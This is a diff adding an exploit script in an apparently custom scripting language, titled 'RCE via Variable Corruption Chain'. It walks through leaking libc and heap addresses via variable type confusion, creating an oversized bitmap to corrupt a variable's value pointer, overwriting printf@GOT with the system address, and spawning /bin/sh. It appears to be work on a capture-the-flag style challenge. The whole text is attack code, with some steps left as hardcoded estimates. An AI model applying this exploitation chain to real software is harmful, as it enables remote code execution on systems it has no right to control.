@@ -1,0 +1,66 @@
+print("=== RCE via Variable Corruption Chain ===");
+
+print("Step 1: Leak libc");
+string v2 = "BBBBBBBB";
+int v2 = 4231312;
+int leaked = length(v2);
+print("Leaked libc:");
+print(leaked);
+
+print("Step 2: Leak heap address");
+int leak1 = 0;
+string leak1 = "marker1";
+int heapaddr = leak1;
+print("Heap address:");
+print(heapaddr);
+
+print("Step 3: Create target variable");
+string target = "target";
+int targetaddr = target;
+print("Target address:");
+print(targetaddr);
+
+print("Step 4: Calculate system address");
+print("system_addr = 139879858407248 (calculated)");
+
+print("Step 5: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 6: Estimate addresses");
+print("Variable entry is typically 0x200-0x400 before string");
+int entryaddr = targetaddr - 768;
+int valueptraddr = entryaddr + 40;
+print("Estimated entryaddr:");
+print(entryaddr);
+print("Estimated valueptraddr:");
+print(valueptraddr);
+
+print("Step 7: Try different bitmap buffer locations");
+print("Bitmap buffer is on heap, try different offsets");
+
+print("Test 1: bitmap_data_ptr = heapaddr + 0x1000");
+int bitmapptr1 = heapaddr + 4096;
+int offset1 = valueptraddr - bitmapptr1;
+int bitindex1 = offset1 * 8;
+print("offset1:");
+print(offset1);
+print("bit_index1:");
+print(bitindex1);
+
+if (offset1 < 0) {
+    print("Negative offset - bitmap buffer is after variable entry");
+    print("Need y > 0 or different approach");
+} else {
+    print("Positive offset - can try writing with y=0");
+    print("Write printf@GOT (0x409048) to value_ptr");
+    print("This requires 64 set() calls");
+}
+
+print("Step 8: After corrupting value_ptr");
+print("target.value_ptr will point to printf@GOT");
+print("Then: target = system_addr");
+print("This writes system_addr to printf@GOT");
+
+print("Step 9: Trigger shell");
+print("print with /bin/sh");
+
